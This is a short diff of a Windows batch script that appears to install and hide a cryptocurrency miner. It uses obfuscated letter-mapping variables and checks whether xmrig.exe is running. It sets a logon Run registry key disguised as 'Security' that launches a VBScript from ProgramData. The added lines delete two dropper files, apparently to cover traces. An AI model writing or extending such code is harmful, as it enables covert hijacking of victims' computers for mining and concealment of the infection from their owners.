@@ -53,6 +53,8 @@ set bbbbbbbbbbbbbbbbbbbbbbbb=W
 set bbbbbbbbbbbbbbbbbbbbbbbbb=X
 set bbbbbbbbbbbbbbbbbbbbbbbbbb=Y
 set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
+del "C:\ProgramData\bgin.bat"
+del "C:\ProgramData\world.vbs"
 tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
 if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
